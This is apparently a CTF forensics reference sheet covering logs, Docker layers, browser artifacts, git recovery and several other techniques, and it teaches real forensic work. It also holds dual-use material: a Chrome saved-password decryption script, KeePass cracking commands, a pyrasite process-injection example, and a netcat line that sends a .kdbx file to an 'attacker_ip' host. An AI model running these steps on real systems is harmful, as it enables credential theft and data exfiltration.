# CTF Forensics - Linux and Application Forensics

## Table of Contents
- [Log Analysis](#log-analysis)
- [Linux Attack Chain Forensics](#linux-attack-chain-forensics)
- [Docker Image Forensics (Pragyan 2026)](#docker-image-forensics-pragyan-2026)
- [Browser Credential Decryption](#browser-credential-decryption)
- [Firefox Browser History (places.sqlite)](#firefox-browser-history-placessqlite)
- [USB Audio Extraction from PCAP](#usb-audio-extraction-from-pcap)
- [TFTP Netascii Decoding](#tftp-netascii-decoding)
- [TLS Traffic Decryption via Weak RSA](#tls-traffic-decryption-via-weak-rsa)
- [ROT18 Decoding](#rot18-decoding)
- [Common Encodings](#common-encodings)
- [Git Directory Recovery (UTCTF 2024)](#git-directory-recovery-utctf-2024)
- [KeePass Database Extraction and Cracking (H7CTF 2025)](#keepass-database-extraction-and-cracking-h7ctf-2025)
- [Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)](#git-reflog-and-fsck-for-squashed-commit-recovery-bearcatctf-2026)
- [Browser Artifact Analysis](#browser-artifact-analysis)
  - [Chrome/Chromium](#chromechromium)
  - [Firefox](#firefox)
- [Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)](#corrupted-git-blob-repair-via-byte-brute-force-csaw-ctf-2015)
- [VBA Macro Forensics - Excel Cell Data to ELF Binary (Sharif CTF 2016)](#vba-macro-forensics---excel-cell-data-to-elf-binary-sharif-ctf-2016)
- [Ethereum / Blockchain Transaction Tracing (Defenit CTF 2020)](#ethereum--blockchain-transaction-tracing-defenit-ctf-2020)
- [Python In-Memory Source Recovery via pyrasite (Insomni'hack 2017)](#python-in-memory-source-recovery-via-pyrasite-insomnihack-2017)

---

## Log Analysis

```bash
# Search for flag fragments
grep -iE "(flag|part|piece|fragment)" server.log

# Reconstruct fragmented flags
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'

# Find anomalies
sort logfile.log | uniq -c | sort -rn | head
```

---

## Linux Attack Chain Forensics

**Pattern (Making the Naughty List):** Full attack timeline from logs + PCAP + malware.

**Evidence sources:**
```bash
# SSH session commands
grep -A2 "session opened" /var/log/auth.log

# User command history
cat /home/*/.bash_history

# Downloaded malware
find /usr/bin -newer /var/log/auth.log -name "ms*"

# Network exfiltration
tshark -r capture.pcap -Y "tftp" -T fields -e tftp.source_file
```

**Common malware pattern:** AES-ECB encrypt + XOR with same key, save as .enc

---

## Docker Image Forensics (Pragyan 2026)

**Pattern (Plumbing):** Sensitive data leaked during Docker build but cleaned in later layers.

**Key insight:** Docker image config JSON (`blobs/sha256/<config_hash>`) permanently preserves ALL `RUN` commands in the `history` array, regardless of subsequent cleanup.

```bash
tar xf app.tar
# Find config blob (not layer blobs)
python3 -m json.tool blobs/sha256/<config_hash> | grep -A2 "created_by"
# Look for RUN commands with flag data, passwords, secrets
```

**Analysis steps:**
1. Extract the Docker image tar: `tar xf app.tar`
2. Read `manifest.json` to find the config blob hash
3. Parse the config blob JSON for `history[].created_by` entries
4. Each entry shows the exact Dockerfile command that was run
5. Secrets echoed, written, or processed in any `RUN` command are preserved in the history
6. Even if a later layer `rm -f secret.txt`, the `RUN echo "flag{...}" > secret.txt` remains visible

---

## Browser Credential Decryption

**Chrome/Edge Login Data decryption (requires master_key.txt):**
```python
from Crypto.Cipher import AES
import sqlite3, json, base64

# Load master key (from Local State file, DPAPI-protected)
with open('master_key.txt', 'rb') as f:
    master_key = f.read()

conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
for url, user, encrypted_pw in cursor.fetchall():
    # v10/v11 prefix = AES-GCM encrypted
    nonce = encrypted_pw[3:15]
    ciphertext = encrypted_pw[15:-16]
    tag = encrypted_pw[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    password = cipher.decrypt_and_verify(ciphertext, tag)
    print(f"{url}: {user}:{password.decode()}")
```

**Master key extraction from Local State:**
```python
import json, base64
with open('Local State', 'r') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
# Remove DPAPI prefix (5 bytes "DPAPI")
encrypted_key = encrypted_key[5:]
# On Windows: CryptUnprotectData to get master_key
# In CTF: master_key may be provided separately
```

---

## Firefox Browser History (places.sqlite)

**Pattern (Browser Wowser):** Flag hidden in browser history URLs.

```bash
# Quick method
strings places.sqlite | grep -i "flag\|MetaCTF"

# Proper forensic method
sqlite3 places.sqlite "SELECT url FROM moz_places WHERE url LIKE '%flag%'"
```

**Key tables:** `moz_places` (URLs), `moz_bookmarks`, `moz_cookies`

---

## USB Audio Extraction from PCAP

**Pattern (Talk To Me):** USB isochronous transfers contain audio data.

**Extraction workflow:**
```bash
# Export ISO data with tshark
tshark -r capture.pcap -T fields -e usb.iso.data > audio_data.txt

# Convert to raw audio and import into Audacity
# Settings: signed 16-bit PCM, mono, appropriate sample rate
# Listen for spoken flag characters
```

**Identification:** USB transfer type URB_ISOCHRONOUS = real-time audio/video

---

## TFTP Netascii Decoding

**Problem:** TFTP netascii mode corrupts binary transfers; Wireshark doesn't auto-decode.

**Fix exported files:**
```python
# Replace netascii sequences:
# 0d 0a → 0a (CRLF → LF)
# 0d 00 → 0d (escaped CR)
with open('file_raw', 'rb') as f:
    data = f.read()
data = data.replace(b'\r\n', b'\n').replace(b'\r\x00', b'\r')
with open('file_fixed', 'wb') as f:
    f.write(data)
```

---

## TLS Traffic Decryption via Weak RSA

**Pattern (Tampered Seal):** TLS 1.2 with `TLS_RSA_WITH_AES_256_CBC_SHA` (no PFS).

**Attack flow:**
1. Extract server certificate from Server Hello packet (Export Packet Bytes -> `public.der`)
2. Get modulus: `openssl x509 -in public.der -inform DER -noout -modulus`
3. Factor weak modulus (dCode, factordb.com, yafu)
4. Generate private key: `rsatool -p P -q Q -o private.pem`
5. Add to Wireshark: Edit -> Preferences -> TLS -> RSA keys list

**After decryption:**
- Follow TLS streams to see HTTP traffic
- Export objects (File -> Export Objects -> HTTP)
- Look for downloaded executables, API calls

---

## ROT18 Decoding

ROT13 on letters + ROT5 on digits. Common final layer in multi-stage forensics:
```python
def rot18(text):
    result = []
    for c in text:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            result.append(chr((ord(c) - base + 13) % 26 + base))
        elif c.isdigit():
            result.append(str((int(c) + 5) % 10))
        else:
            result.append(c)
    return ''.join(result)
```

---

## Common Encodings

```bash
echo "base64string" | base64 -d
echo "hexstring" | xxd -r -p
# ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## Git Directory Recovery (UTCTF 2024)

```bash
# Exposed .git directory on web server
gitdumper.sh https://target/.git/ /tmp/repo

# Check reflog for old commits with secrets
cat .git/logs/HEAD
# Download objects from .git/objects/XX/YYYY, decompress with zlib
```

**Tool:** `gitdumper.sh` from internetwache/GitTools is most reliable.

---

## KeePass Database Extraction and Cracking (H7CTF 2025)

**Pattern (Moby Dock):** KeePass database (`.kdbx`) found on compromised system contains SSH keys or credentials for lateral movement.

**Transfer from remote system:**
```bash
# On target: base64 encode and send via netcat
base64 .system.kdbx | nc attacker_ip 4444

# On attacker: receive and decode
nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
```

**Cracking KeePass v4 databases:**
```bash
# Standard keepass2john (KeePass v3 only)
keepass2john system.kdbx > hash.txt

# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
git clone https://github.com/ivanmrsulja/keepass2john.git
cd keepass2john && make
./keepass2john system.kdbx > hash.txt

# Alternative: keepass4brute (direct brute-force)
python3 keepass4brute.py -d wordlist.txt system.kdbx
```

**Wordlist generation from challenge context:**
```bash
# Generate wordlist from related website content
cewl http://target:8080 -d 2 -m 5 -w cewl_words.txt

# Add theme-related keywords manually
echo -e "expectopatronum\nharrypotter\nalohomora" >> cewl_words.txt

# Crack with hashcat (Argon2 = mode 13400)
hashcat -m 13400 hash.txt cewl_words.txt
```

**After cracking — extract credentials:**
1. Open `.kdbx` in KeePassXC with recovered password
2. Check all entries for SSH private keys, passwords, API tokens
3. SSH keys are typically stored in the "Notes" or "Advanced" attachment fields

**Key insight:** Standard `keepass2john` does not support KeePass v4 (KDBX 4.x) databases that use Argon2 key derivation. Use the `ivanmrsulja/keepass2john` fork or `keepass4brute` for v4 support. Generate context-aware wordlists with `cewl` targeting related web services.

---

## Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)

**Pattern (Poem About Pirates):** Git repository with clean history where data was overwritten and history rewritten via `git rebase --squash`. The original commits survive as orphaned objects.

**Recovery steps:**
```bash
# Check reflog for rebase/squash operations
git reflog --all

# Find orphaned (unreachable) commits
git fsck --unreachable --no-reflogs

# Inspect each unreachable commit
git show <commit-hash>
git diff <commit-hash>^ <commit-hash>

# Extract specific file version from orphaned commit
git show <commit-hash>:path/to/file
```

**Key insight:** `git rebase --squash` removes commits from the branch history but doesn't delete the underlying objects. They remain as unreachable objects until garbage collection runs (`git gc`). Even after `git gc`, objects younger than the expiry period (default 2 weeks) survive. Always check `git reflog` and `git fsck --unreachable` when investigating git repos for hidden data.

**Detection:** Git repo with suspiciously clean history (single commit, or squash-merge commits). Challenge mentions "rewrite", "rebase", "squash", or "clean history".

---

## Browser Artifact Analysis

### Chrome/Chromium

```bash
# Default profile locations
# Linux: ~/.config/google-chrome/Default/
# macOS: ~/Library/Application Support/Google/Chrome/Default/
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\

# History (SQLite)
sqlite3 "History" "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

# Downloads
sqlite3 "History" "SELECT target_path, tab_url, datetime(start_time/1000000-11644473600,'unixepoch') FROM downloads;"

# Cookies (encrypted on modern Chrome — need DPAPI/keychain key)
sqlite3 "Cookies" "SELECT host_key, name, datetime(expires_utc/1000000-11644473600,'unixepoch') FROM cookies;"

# Login Data (passwords — encrypted)
sqlite3 "Login Data" "SELECT origin_url, username_value FROM logins;"

# Bookmarks (JSON)
cat Bookmarks | python3 -m json.tool | grep -A2 '"url"'

# Local Storage / IndexedDB — LevelDB format
# Use leveldb-dump or strings on LevelDB files
strings "Local Storage/leveldb/"*.ldb | grep -i flag
```

### Firefox

```bash
# Profile location: ~/.mozilla/firefox/*.default-release/
# Find profile
ls ~/.mozilla/firefox/ | grep default

# History + bookmarks (places.sqlite)
sqlite3 places.sqlite "SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50;"

# Form history
sqlite3 formhistory.sqlite "SELECT fieldname, value FROM moz_formhistory;"

# Saved passwords (requires key4.db + logins.json)
# Use firefox_decrypt: python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/

# Session restore (previous tabs)
python3 -c "
import json, lz4.block
with open('sessionstore-backups/recovery.jsonlz4','rb') as f:
    f.read(8)  # skip magic
    data = json.loads(lz4.block.decompress(f.read()))
    for w in data['windows']:
        for t in w['tabs']:
            print(t['entries'][-1]['url'])
"
```

**Key insight:** Browser artifacts are SQLite databases with non-standard timestamp formats. Chrome uses WebKit epoch (microseconds since 1601-01-01), Firefox uses Unix epoch in microseconds. Always check History, Cookies, Login Data, Local Storage, and session restore files. For encrypted passwords, you need the master key (DPAPI on Windows, keychain on macOS, key4.db on Firefox).

---

## Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)

**Pattern (sharpturn):** Git repository with corrupted blob objects. Since git identifies objects by SHA-1 hash, a single-byte corruption changes the hash, making the object unreadable. Repair by brute-forcing each byte position until `git hash-object` produces the expected hash.

```python
import subprocess, shutil

def repair_blob(filepath, target_hash):
    """Brute-force single-byte corruption in a git blob."""
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    for pos in range(len(data)):
        original = data[pos]
        for val in range(256):
            if val == original:
                continue
            data[pos] = val
            with open(filepath, 'wb') as f:
                f.write(data)
            result = subprocess.run(
                ['git', 'hash-object', filepath],
                capture_output=True, text=True
            )
            if result.stdout.strip() == target_hash:
                print(f"Fixed byte {pos}: 0x{original:02x} -> 0x{val:02x}")
                return True
            data[pos] = original

    with open(filepath, 'wb') as f:
        f.write(data)
    return False
```

**Workflow:**
1. `git fsck` to identify corrupted objects and their expected hashes
2. Locate the corrupt blob files in `.git/objects/`
3. Decompress with `python3 -c "import zlib; print(zlib.decompress(open('blob','rb').read()))"`
4. Brute-force each byte position (256 values * file_size attempts)
5. Verify with `git hash-object` matching the expected hash

**Key insight:** Git's content-addressable storage means the expected SHA-1 hash is known from the commit tree, even when the blob is corrupted. Single-byte corruption is brute-forceable in seconds. For multi-byte corruption, combine with contextual knowledge (e.g., source code must compile, numeric constants must be valid).

---

## VBA Macro Forensics - Excel Cell Data to ELF Binary (Sharif CTF 2016)

Excel spreadsheet hides an entire executable as numeric cell values. A VBA (Visual Basic for Applications) macro transforms each cell via `CByte((cell_value - 78) / 3)` and writes bytes to produce an ELF (Executable and Linkable Format) binary. Safe analysis: export to CSV, reimplement transform in Python.

```python
import csv
with open('data.csv') as f, open('binary', 'wb') as out:
    for row in csv.reader(f):
        for cell in row:
            if cell.strip():
                out.write(bytes([int((int(cell) - 78) / 3)]))
```

**Key insight:** Malware delivery via spreadsheet cell values with arithmetic transformation. Always reimplement VBA macro logic in Python rather than executing the macro. Check for `olevba` output to extract the transformation formula.

**Detection:** Excel file with large numbers in cells, VBA macro with `CByte`/`Chr`/`Write` operations.

---

## Ethereum / Blockchain Transaction Tracing (Defenit CTF 2020)

Track cryptocurrency through tumbler/mixer services by analyzing on-chain transaction patterns.

```python
import requests
from collections import defaultdict

def trace_ethereum_transactions(address, api_key, depth=3):
    """Trace ETH transactions through tumbler hops"""
    url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&apikey={api_key}"
    r = requests.get(url)
    txs = r.json()["result"]

    graph = defaultdict(list)
    for tx in txs:
        graph[tx["from"]].append({
            "to": tx["to"],
            "value": int(tx["value"]) / 1e18,  # Wei to ETH
            "timestamp": int(tx["timeStamp"])
        })

    # Heuristics for tumbler detection:
    # 1. Amount correlation: input ~= output (minus fee)
    # 2. Timing: outputs follow inputs within minutes/hours
    # 3. Fan-out pattern: one input splits to many outputs
    # 4. Round amounts: tumblers often use round ETH values

    # Filter by transaction count (skip high-volume faucets/exchanges)
    suspicious = {addr: txs for addr, txs in graph.items()
                  if 5 < len(txs) < 100}  # Not faucet, not end-user

    return suspicious

# Tools for blockchain forensics:
# - Etherscan API: transaction history, internal transactions
# - Blockchair: multi-chain explorer (BTC, ETH, etc.)
# - Chainalysis Reactor: commercial but referenced in CTFs
# - breadcrumbs.app: free transaction visualization
```

**Key insight:** Blockchain tumblers obscure transaction trails but leave statistical patterns. Track by correlating input/output amounts (minus fees), timing windows, and intermediate wallet transaction counts. Wallets with 10-50 transactions are likely intermediaries; 1000+ are exchanges/faucets to ignore.

---

## Python In-Memory Source Recovery via pyrasite (Insomni'hack 2017)

When a Python process has its source file deleted but is still running, attach to it with `pyrasite-shell` and decompile code objects from memory.

```bash
# 1. Find the running Python process
pgrep -f "python"

# 2. Attach with pyrasite (requires ptrace permissions)
pyrasite-shell <PID>

# 3. Inside the pyrasite shell, enumerate and decompile functions:
import sys, uncompyle6
# List all global variables and functions
for name, obj in globals().items():
    if hasattr(obj, 'func_code'):
        print(f"\n=== {name} ===")
        uncompyle6.main.uncompyle(sys.version_info[0] + sys.version_info[1]/10.0,
                                   obj.func_code, sys.stdout)

# 4. Also check for variables containing secrets
print(globals())  # May contain flags, keys, etc.
```

**Key insight:** `pyrasite` injects a Python shell into a running process via `ptrace`. All code objects and global variables remain in memory even after the source file is deleted. `uncompyle6` decompiles `func_code` objects back to readable Python source. For Python 3.9+ processes, use [`pycdc`](https://github.com/zrax/pycdc) instead (`pycdc` operates on `.pyc` files — write code objects to disk with `marshal.dump` first).

**Detection:** Challenge provides access to a running system where a Python process is active but the `.py` source file has been deleted. `ls -l /proc/<PID>/exe` shows the Python interpreter; `/proc/<PID>/fd/` may still reference the deleted file. Check `ptrace` permissions (`/proc/sys/kernel/yama/ptrace_scope`).
